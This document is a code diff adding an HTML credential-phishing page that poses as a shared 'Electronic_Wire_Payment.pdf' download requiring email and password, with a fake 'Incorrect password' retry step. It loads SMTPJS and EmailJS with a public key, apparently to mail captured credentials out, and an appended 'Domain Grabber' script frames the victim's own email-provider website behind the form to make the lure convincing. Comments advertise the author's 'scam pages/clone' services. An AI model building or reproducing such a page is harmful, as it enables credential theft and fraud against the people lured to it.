@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>PDF Download Authentication</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- 
+      👨‍💻 Developed by Vikram Joseph
+      📱 Telegram: https://t.me/vikramjoseph
+      💼 Services: Websites, Scam pages/clone, Landing Pages, Web Apps, Mobile Apps
+    -->
+
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Roboto", sans-serif;
+        background: #f2f2f2;
+        margin: 0;
+        padding: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+      .form-box {
+        background: white;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 500px;
+        text-align: center;
+        animation: fadeDown 0.8s ease forwards;
+      }
+      @keyframes fadeDown {
+        from {
+          opacity: 0;
+          transform: translateY(-30px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      .form-box img {
+        width: 50px;
+        margin-bottom: 10px;
+      }
+      .form-box h4 {
+        margin: 10px 0 5px;
+        font-weight: normal;
+      }
+      .pdf-link {
+        display: inline-block;
+        margin: 10px 0;
+        color: #0066cc;
+        font-size: 14px;
+        text-decoration: none;
+      }
+      .input-container {
+        position: relative;
+        margin: 10px 0;
+      }
+      .input-container svg {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        width: 16px;
+        height: 16px;
+        fill: #888;
+      }
+      .input-field {
+        width: 100%;
+        padding: 10px 10px 10px 35px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+      .error-msg {
+        color: red;
+        font-size: 13px;
+        text-align: left;
+        margin-top: 5px;
+      }
+      .download-btn {
+        background-color: #007bff;
+        color: white;
+        border: none;
+        padding: 10px 15px;
+        margin-top: 15px;
+        border-radius: 5px;
+        width: 100%;
+        font-size: 16px;
+        cursor: pointer;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      .download-btn svg {
+        margin-right: 8px;
+      }
+      .spinner {
+        border: 3px solid #fff;
+        border-top: 3px solid #ccc;
+        border-radius: 50%;
+        width: 16px;
+        height: 16px;
+        animation: spin 1s linear infinite;
+        margin-left: 8px;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      @media (max-width: 480px) {
+        .form-box {
+          padding: 20px;
+        }
+        .download-btn {
+          font-size: 15px;
+          padding: 10px;
+        }
+      }
+    </style>
+    <style>
+      body {
+        background: linear-gradient(120deg, #f5f7fa 0%, #c3cfe2 100%);
+      }
+      .form-box {
+        border-radius: 20px;
+        box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.18), 0 1.5px 8px 0 rgba(0,0,0,0.04);
+        border: 1.5px solid #e3e8ee;
+        padding: 48px 40px 36px 40px;
+        max-width: 400px;
+        margin: 0 auto;
+        font-size: 16px;
+        background: #fff;
+        position: relative;
+      }
+      .form-box img {
+        width: 64px;
+        margin-bottom: 20px;
+        filter: drop-shadow(0 2px 8px rgba(0,0,0,0.10));
+      }
+      .form-box h4 {
+        font-size: 1.45rem;
+        font-weight: 700;
+        color: #1a202c;
+        margin-bottom: 8px;
+        letter-spacing: 0.01em;
+      }
+      .form-box p {
+        color: #5a6270;
+        font-size: 15px;
+        margin-bottom: 20px;
+        font-weight: 500;
+      }
+      .pdf-link {
+        color: #0056b3;
+        font-weight: 600;
+        font-size: 15px;
+        margin-bottom: 20px;
+        transition: color 0.2s;
+        letter-spacing: 0.01em;
+      }
+      .pdf-link:hover {
+        color: #003366;
+        text-decoration: underline;
+      }
+      .input-container {
+        margin-bottom: 22px;
+      }
+      .input-container svg {
+        top: 13px;
+        left: 13px;
+        width: 20px;
+        height: 20px;
+        fill: #b0b7c3;
+      }
+      .input-field {
+        background: #f7fafc;
+        border: 1.5px solid #d1d9e6;
+        border-radius: 10px;
+        padding: 13px 13px 13px 48px;
+        font-size: 15.5px;
+        transition: border 0.2s, background 0.2s;
+        font-weight: 500;
+        color: #1a202c;
+      }
+      .input-field:focus {
+        border: 1.5px solid #0056b3;
+        outline: none;
+        background: #fff;
+      }
+      .download-btn {
+        background: linear-gradient(90deg, #0056b3 0%, #007bff 100%);
+        color: #fff;
+        border-radius: 10px;
+        font-weight: 700;
+        font-size: 18px;
+        padding: 14px 0;
+        margin-top: 22px;
+        box-shadow: 0 2px 8px rgba(0, 123, 255, 0.10);
+        border: none;
+        transition: background 0.2s, box-shadow 0.2s;
+        letter-spacing: 0.01em;
+      }
+      .download-btn:hover {
+        background: linear-gradient(90deg, #003366 0%, #0056b3 100%);
+        box-shadow: 0 4px 16px rgba(0, 86, 179, 0.13);
+      }
+      .error-msg {
+        color: #d90429;
+        font-size: 13.5px;
+        margin-top: 7px;
+        text-align: left;
+        font-weight: 600;
+      }
+      .progress-container {
+        margin-bottom: 32px;
+        height: 10px;
+        border-radius: 8px;
+        background: #e3e8ee;
+        overflow: hidden;
+      }
+      .progress-bar {
+        height: 100%;
+        border-radius: 8px;
+        background: linear-gradient(90deg, #0056b3 0%, #007bff 100%);
+        box-shadow: 0 1px 4px rgba(0,86,179,0.08);
+      }
+      @media (max-width: 480px) {
+        .form-box {
+          padding: 18px 4vw 18px 4vw;
+          max-width: 98vw;
+        }
+        .download-btn {
+          font-size: 16px;
+          padding: 11px 0;
+        }
+        .form-box img {
+          width: 48px;
+        }
+      }
+    </style>
+    <style>
+      .progress-container {
+        width: 100%;
+        background: #e3e8ee;
+        border-radius: 8px;
+        height: 8px;
+        margin-bottom: 24px;
+        overflow: hidden;
+      }
+      .progress-bar {
+        height: 100%;
+        width: 33%;
+        background: linear-gradient(90deg, #0056b3 0%, #007bff 100%);
+        transition: width 0.4s cubic-bezier(.4,0,.2,1);
+      }
+    </style>
+    <style>
+      .form-box {
+        position: relative;
+        z-index: 10;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- 
+      👨‍💻 UI by @vikramjoseph (Telegram)
+      ⚡ Custom HTML/CSS/JS for authentication interface
+    -->
+
+    <div class="form-box">
+      <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg"
+        alt="PDF Icon"
+      />
+      <h4>Download Scanned Shared Document</h4>
+      <p style="font-size: 13px; color: #666">Authentication required</p>
+      <a href="#" class="pdf-link">📄 Electronic_Wire_Payment.pdf</a>
+
+      <!-- Step 1 -->
+      <form id="step1">
+        <div class="input-container">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+            <path
+              d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"
+            />
+          </svg>
+          <input
+            type="email"
+            class="input-field"
+            id="emailInput"
+            disabled
+            placeholder="Enter your email"
+            required
+          />
+        </div>
+        <button type="submit" class="download-btn" id="step1Btn">
+          <span>Continue</span>
+        </button>
+      </form>
+
+      <!-- Step 2 -->
+      <form id="step2" style="display: none">
+        <div class="input-container">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+            <path
+              d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"
+            />
+          </svg>
+          <input
+            type="email"
+            class="input-field"
+            id="emailInputView"
+            disabled
+            placeholder="Enter your email"
+          />
+        </div>
+
+        <div class="input-container" id="passwordContainer">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+            <path
+              d="M8 1a4 4 0 0 0-4 4v2H3.5A1.5 1.5 0 0 0 2 8.5v5A1.5 1.5 0 0 0 3.5 15h9a1.5 1.5 0 0 0 1.5-1.5v-5A1.5 1.5 0 0 0 12.5 7H12V5a4 4 0 0 0-4-4zM5 5a3 3 0 1 1 6 0v2H5V5z"
+            />
+          </svg>
+          <input
+            type="password"
+            class="input-field"
+            id="passwordInput"
+            placeholder="Enter password"
+            required
+          />
+        </div>
+
+        <div
+          class="input-container"
+          id="confirmContainer"
+          style="display: none"
+        >
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+            <path
+              d="M8 1a4 4 0 0 0-4 4v2H3.5A1.5 1.5 0 0 0 2 8.5v5A1.5 1.5 0 0 0 3.5 15h9a1.5 1.5 0 0 0 1.5-1.5v-5A1.5 1.5 0 0 0 12.5 7H12V5a4 4 0 0 0-4-4zM5 5a3 3 0 1 1 6 0v2H5V5z"
+            />
+          </svg>
+          <input
+            type="password"
+            class="input-field"
+            id="confirmInput"
+            placeholder="Confirm password"
+          />
+          <div class="error-msg" id="passwordError" style="display: none">
+            Incorrect password
+          </div>
+        </div>
+
+        <button type="submit" class="download-btn" id="step2Btn">
+          <span>Download</span>
+        </button>
+      </form>
+    </div>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="./script.js"></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init({
+          publicKey: "RDl-H5GufwilmNdCs",
+        });
+      })();
+    </script>
+    <!-- 
+      🚀 Functional logic created by Vikram Joseph
+      📬 Telegram: https://t.me/vikramjoseph
+      Need a landing page, scam pages/clone, user panel, or app? Contact now!
+    -->
+  </body>
+</html>
+
+<!-- Dynamic Login Background and Domain Grabber (Appended) -->
+<style>
+  #dynamic-bg-container {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    width: 100vw; height: 100vh;
+    z-index: 0;
+    overflow: hidden;
+    pointer-events: none;
+  }
+  #dynamic-bg-iframe {
+    position: absolute;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    border: none;
+    opacity: 0.7;
+    transition: opacity 0.5s;
+    z-index: 1;
+    pointer-events: none;
+  }
+  #dynamic-bg-overlay {
+    position: absolute;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: rgba(0,0,0,0.5);
+    z-index: 2;
+    pointer-events: none;
+  }
+  #dynamic-bg-fallback {
+    position: absolute;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1500&q=80') center center/cover no-repeat;
+    z-index: 1;
+    display: none;
+  }
+  #dynamic-bg-message {
+    position: absolute;
+    top: 50%; left: 50%; transform: translate(-50%, -50%);
+    color: #fff; font-size: 1.5em; text-align: center;
+    z-index: 3;
+    display: none;
+    text-shadow: 0 2px 8px #000;
+  }
+  #dynamic-bg-spinner {
+    position: absolute;
+    top: 50%; left: 50%; transform: translate(-50%, -50%);
+    z-index: 4;
+    display: none;
+  }
+  .spinner {
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #3498db;
+    border-radius: 50%;
+    width: 48px;
+    height: 48px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin { 100% { transform: rotate(360deg); } }
+  #domain-display {
+    font-size: 0.95em;
+    color: #555;
+    margin-bottom: 0.5em;
+    min-height: 1.2em;
+    text-align: center;
+  }
+</style>
+<div id="dynamic-bg-container">
+  <iframe id="dynamic-bg-iframe" src="" style="display:none"></iframe>
+  <div id="dynamic-bg-fallback"></div>
+  <div id="dynamic-bg-overlay"></div>
+  <div id="dynamic-bg-message"></div>
+  <div id="dynamic-bg-spinner"><div class="spinner"></div></div>
+</div>
+<script>
+// Domain mapping for special cases (e.g., gmail.com → google.com)
+const DOMAIN_MAPPINGS = {
+  'gmail.com': 'google.com',
+  'yahoo.com': 'yahoo.com',
+  'outlook.com': 'microsoft.com',
+  'hotmail.com': 'microsoft.com',
+};
+function isValidDomain(domain) {
+  return /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain);
+}
+function extractDomain(email) {
+  const atIdx = email.indexOf('@');
+  if (atIdx === -1) return '';
+  let domain = email.slice(atIdx + 1).trim().toLowerCase();
+  if (DOMAIN_MAPPINGS[domain]) {
+    domain = DOMAIN_MAPPINGS[domain];
+  }
+  return domain;
+}
+function setBackgroundForDomain(domain) {
+  const iframe = document.getElementById('dynamic-bg-iframe');
+  const fallback = document.getElementById('dynamic-bg-fallback');
+  const message = document.getElementById('dynamic-bg-message');
+  const spinner = document.getElementById('dynamic-bg-spinner');
+  iframe.style.display = 'none';
+  fallback.style.display = 'none';
+  message.style.display = 'none';
+  if (isValidDomain(domain)) {
+    spinner.style.display = 'block';
+    iframe.src = 'https://www.' + domain;
+    iframe.style.opacity = 0.7;
+    iframe.style.display = 'block';
+    let loaded = false;
+    const onLoad = () => {
+      loaded = true;
+      spinner.style.display = 'none';
+      message.style.display = 'none';
+      iframe.style.opacity = 0.7;
+    };
+    const onError = () => {
+      spinner.style.display = 'none';
+      iframe.style.display = 'none';
+      fallback.style.display = 'block';
+      message.textContent = 'Website unavailable or blocked by browser. Showing fallback image.';
+      message.style.display = 'block';
+    };
+    iframe.onload = null;
+    iframe.onerror = null;
+    iframe.onload = onLoad;
+    iframe.onerror = onError;
+    setTimeout(() => {
+      if (!loaded && iframe.style.display === 'block') {
+        onError();
+      }
+    }, 3000);
+  } else {
+    fallback.style.display = 'block';
+    message.textContent = domain ? 'Invalid domain format.' : '';
+    message.style.display = domain ? 'block' : 'none';
+    spinner.style.display = 'none';
+  }
+}
+function onEmailInput(e) {
+  const email = e.target.value.trim();
+  const domainDisplay = document.getElementById('domain-display');
+  const domain = extractDomain(email);
+  if (domain) {
+    domainDisplay.textContent = 'Detected domain: ' + domain;
+  } else {
+    domainDisplay.textContent = '';
+  }
+  setBackgroundForDomain(domain);
+}
+document.addEventListener('DOMContentLoaded', function() {
+  // Insert domain display above the email input if not present
+  var emailInput = document.getElementById('emailInput');
+  if (emailInput && !document.getElementById('domain-display')) {
+    var domainDiv = document.createElement('div');
+    domainDiv.id = 'domain-display';
+    emailInput.parentNode.parentNode.insertBefore(domainDiv, emailInput.parentNode);
+  }
+  if (emailInput) {
+    emailInput.addEventListener('input', onEmailInput);
+    setBackgroundForDomain('');
+  }
+});
+</script>
+<!-- End Dynamic Login Background and Domain Grabber -->
